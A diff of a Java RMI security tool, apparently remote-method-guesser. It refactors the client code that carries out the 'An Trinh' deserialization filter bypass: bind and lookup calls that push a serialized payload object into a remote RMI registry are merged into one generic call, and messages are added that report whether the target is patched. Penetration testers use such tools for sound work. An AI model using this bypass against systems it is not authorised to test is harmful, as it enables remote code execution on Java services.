@@ -36,6 +36,7 @@ public class RegistryClient {
     private Constructor<?> constructor;
 
     private static final long interfaceHash = 4905912898345647071L;
+    private static final String[] callNames = new String[] {"bind", "list", "lookup", "rebind", "unbind"};
 
     public RegistryClient(RMIWhisperer rmiRegistry)
     {
@@ -60,7 +61,7 @@ public class RegistryClient {
 
     public void invokeAnTrinhBypass(String host, int port, boolean local)
     {
-        String call = "";
+        String callName = "";
         Object payloadObject = null;
 
         try {
@@ -75,20 +76,20 @@ public class RegistryClient {
 
         try {
             if( !local ) {
+                callName = callNames[2];
                 lookupCall(payloadObject);
-                call = "lookupCall";
             } else {
+                callName = callNames[0];
                 bindCall(payloadObject);
-                call = "bindCall";
             }
 
         } catch(java.rmi.ConnectException e) {
-            Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during " + call + " operation.");
+            Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during " + callName + " call.");
             RMGUtils.stackTrace(e);
             RMGUtils.exit();
 
         } catch(java.rmi.ConnectIOException e) {
-            Logger.eprintlnMixedYellow("Caught", "ConnectIOException", "during " + call + " operation.");
+            Logger.eprintlnMixedYellow("Caught", "ConnectIOException", "during " + callName + " call.");
             Logger.eprintlnMixedBlue("Remote endpoint probably uses an", "SSL socket");
             Logger.eprintlnMixedYellow("Retry with the", "--ssl", "option.");
             RMGUtils.stackTrace(e);
@@ -98,24 +99,46 @@ public class RegistryClient {
 
             Throwable cause = RMGUtils.getCause(e);
             if( cause instanceof java.rmi.AccessException && cause.getMessage().contains("is non-local host")) {
-                Logger.eprintMixedYellow("Caught", "AccessException", "during " + call + ".");
+                Logger.eprintMixedYellow("Caught", "AccessException", "during " + callName + " call.");
                 Logger.printlnPlainMixedBlue(" Deserialization filter bypass", "failed.");
 
-                if( local )
-                    Logger.eprintlnMixedYellow("Notice that this bypass usually only works from", "localhost.");
+                if( local ) {
+                    Logger.eprintMixedYellow("Notice: With", "--local", "the bypass usually only works from ");
+                    Logger.printlnPlainBlue("localhost.");
+                }
 
                 RMGUtils.showStackTrace(e);
+                RMGUtils.exit();
+
+            } else if( cause instanceof java.lang.ClassCastException && cause.getMessage().contains("Cannot cast an object to java.lang.String")) {
+                Logger.eprintlnMixedYellow("Caught", "ClassCastException", "during " + callName + " call.");
+                Logger.eprintlnMixedBlue("RMI server treats Strings specially during deserialization", "(patched).");
+                Logger.eprintlnMixedYellow("Bypass could still work locally using the", "--local", "option.");
+                RMGUtils.showStackTrace(e);
+                RMGUtils.exit();
+
+            } else if( cause instanceof java.rmi.RemoteException && cause.getMessage().contains("Method is not Remote")) {
+                Logger.eprintlnMixedYellow("Caught", "RemoteException", "during " + callName + " call.");
+                Logger.eprintMixedBlue("Deserialization filter bypass", "failed.", "The targeted server");
+                Logger.printlnPlainYellow(" is patched.");
+                RMGUtils.showStackTrace(e);
+                RMGUtils.exit();
+
+            } else {
+                Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during " + callName + " call.");
+                Logger.println("Please report this to improve rmg :)");
+                RMGUtils.stackTrace(e);
                 RMGUtils.exit();
             }
 
         } catch( Exception e ) {
-            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during " + call + ".");
+            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during " + callName + " call.");
             Logger.println("Please report this to improve rmg :)");
             RMGUtils.stackTrace(e);
             RMGUtils.exit();
         }
 
-        Logger.printlnMixedBlue("Caught", "no Exception", "during " + call + ".");
+        Logger.printlnMixedBlue("Caught", "no Exception", "during " + callName + " call.");
         Logger.printlnMixedYellow("Deserialization filter bypass", "probably worked :)");
     }
 
@@ -138,90 +161,34 @@ public class RegistryClient {
         return payloadObject;
     }
 
-    @SuppressWarnings("deprecation")
     public void bindCall(Object payloadObject) throws Exception
     {
-        try {
-            Endpoint endpoint = rmi.getEndpoint();
-            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.REGISTRY_ID), endpoint, false));
+        Object[] callArguments = new Object[] {"Bypass incomming...", payloadObject};
+        genericCall(0, callArguments);
+    }
 
-            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, 0, interfaceHash);
-            try {
-                ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
-                enableReplaceField.set(out, false);
-
-                out.writeObject("Bypass incomming...");
-                out.writeObject(payloadObject);
-
-            } catch(java.io.IOException e) {
-                throw new java.rmi.MarshalException("error marshalling arguments", e);
-            }
-
-            remoteRef.invoke(call);
-            remoteRef.done(call);
-
-        } catch(java.rmi.ConnectException e) {
-
-            Throwable t = RMGUtils.getCause(e);
-
-            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
-                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during bindCall operation.");
-                Logger.eprintMixedBlue("Target", "refused", "the connection.");
-                Logger.printlnPlainMixedBlue(" The specified port is probably", "closed.");
-                RMGUtils.showStackTrace(e);
-                RMGUtils.exit();
-
-            } else {
-                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during bindCall operation.");
-                RMGUtils.stackTrace(e);
-                RMGUtils.exit();
-            }
-
-        } catch(java.rmi.ConnectIOException e) {
-
-            Throwable t = RMGUtils.getCause(e);
-
-            if( t instanceof java.net.NoRouteToHostException) {
-                Logger.eprintlnMixedYellow("Caught unexpected", "NoRouteToHostException", "during bindCall operation.");
-                Logger.eprintln("Have you entered the correct target?");
-                RMGUtils.showStackTrace(e);
-                RMGUtils.exit();
-
-            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
-                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during bindCall operation.");
-                Logger.eprintMixedBlue("Remote endpoint is either", "no RMI endpoint", "or uses an");
-                Logger.printlnPlainBlue(" SSL socket.");
-                Logger.eprintlnMixedYellow("Retry the operation using the", "--ssl", "option.");
-                RMGUtils.showStackTrace(e);
-                RMGUtils.exit();
-
-            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
-                Logger.eprintlnMixedYellow("Caught unexpected", "SSLException", "during bindCall operation.");
-                Logger.eprintlnMixedBlue("You probably used", "--ssl", "on a plaintext connection?");
-                RMGUtils.showStackTrace(e);
-                RMGUtils.exit();
-
-            } else {
-                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during bindCall operation.");
-                RMGUtils.stackTrace(e);
-                RMGUtils.exit();
-            }
-        }
+    public void lookupCall(Object payloadObject) throws Exception
+    {
+        Object[] callArguments = new Object[] {payloadObject};
+        genericCall(2, callArguments);
     }
 
     @SuppressWarnings("deprecation")
-    public void lookupCall(Object payloadObject) throws Exception
+    public void genericCall(int callID, Object[] callArguments) throws Exception
     {
+        String callName = callNames[callID];
+
         try {
             Endpoint endpoint = rmi.getEndpoint();
             RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.REGISTRY_ID), endpoint, false));
 
-            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, 2, interfaceHash);
+            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, callID, interfaceHash);
             try {
                 ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
                 enableReplaceField.set(out, false);
 
-                out.writeObject(payloadObject);
+                for(Object o : callArguments)
+                    out.writeObject(o);
 
             } catch(java.io.IOException e) {
                 throw new java.rmi.MarshalException("error marshalling arguments", e);
@@ -235,14 +202,14 @@ public class RegistryClient {
             Throwable t = RMGUtils.getCause(e);
 
             if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
-                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during lookupCall operation.");
+                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during " + callName + " call.");
                 Logger.eprintMixedBlue("Target", "refused", "the connection.");
                 Logger.printlnPlainMixedBlue(" The specified port is probably", "closed.");
                 RMGUtils.showStackTrace(e);
                 RMGUtils.exit();
 
             } else {
-                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during lookupCall operation.");
+                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during " + callName + " call.");
                 RMGUtils.stackTrace(e);
                 RMGUtils.exit();
             }
@@ -252,13 +219,13 @@ public class RegistryClient {
             Throwable t = RMGUtils.getCause(e);
 
             if( t instanceof java.net.NoRouteToHostException) {
-                Logger.eprintlnMixedYellow("Caught unexpected", "NoRouteToHostException", "during lookupCall operation.");
+                Logger.eprintlnMixedYellow("Caught unexpected", "NoRouteToHostException", "during " + callName + " call.");
                 Logger.eprintln("Have you entered the correct target?");
                 RMGUtils.showStackTrace(e);
                 RMGUtils.exit();
 
             } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
-                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during lookupCall operation.");
+                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during " + callName + " call.");
                 Logger.eprintMixedBlue("Remote endpoint is either", "no RMI endpoint", "or uses an");
                 Logger.printlnPlainBlue(" SSL socket.");
                 Logger.eprintlnMixedYellow("Retry the operation using the", "--ssl", "option.");
@@ -266,13 +233,13 @@ public class RegistryClient {
                 RMGUtils.exit();
 
             } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
-                Logger.eprintlnMixedYellow("Caught unexpected", "SSLException", "during lookupCall operation.");
+                Logger.eprintlnMixedYellow("Caught unexpected", "SSLException", "during " + callName + " call.");
                 Logger.eprintlnMixedBlue("You probably used", "--ssl", "on a plaintext connection?");
                 RMGUtils.showStackTrace(e);
                 RMGUtils.exit();
 
             } else {
-                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during lookupCall operation.");
+                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during " + callName + " call.");
                 RMGUtils.stackTrace(e);
                 RMGUtils.exit();
             }
